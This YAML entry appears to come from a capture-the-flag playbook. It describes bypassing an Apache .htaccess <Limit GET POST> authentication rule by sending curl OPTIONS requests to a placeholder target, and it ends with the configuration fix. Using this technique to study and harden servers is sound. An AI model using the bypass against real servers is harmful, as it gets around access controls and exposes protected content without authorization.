name: http_method_tampering_htaccess_bypass
category: web
tags: [http_method, htaccess, authentication_bypass, misconfiguration]
indicators:
  - ".htaccess with <Limit> directive"
  - "Authentication only for specific HTTP methods"
  - "GET/POST restricted but other methods allowed"
  - "Apache web server"

tricks:
  - name: "Step 1: Identify htaccess restriction"
    when: "Found protected resource"
    how: "Analyze .htaccess configuration"
    payload: |
      # .htaccess content:
      # <Limit GET POST>
      #     Require valid-user
      # </Limit>
      # Only GET and POST require authentication!

  - name: "Step 2: Use alternative HTTP method"
    when: "Limit directive restricts specific methods"
    how: "Try OPTIONS, PUT, DELETE, PATCH, etc."
    payload: |
      curl -X OPTIONS "http://TARGET/index.php"
      # OPTIONS method bypasses the <Limit GET POST> restriction
      # Server returns the protected content

  - name: "Step 3: Get flag"
    when: "Execute attack"
    how: "Send OPTIONS request"
    payload: |
      curl -X OPTIONS "http://TARGET/index.php"
      # Response: Congratulations, here is the flag: flag{...}

  - name: "Key insight"
    when: "Understanding the vulnerability"
    how: "Use LimitExcept instead of Limit"
    payload: |
      # Secure configuration should use:
      # <LimitExcept GET POST>
      #     Deny from all
      # </LimitExcept>
      # Or simply:
      # Require valid-user (without Limit)

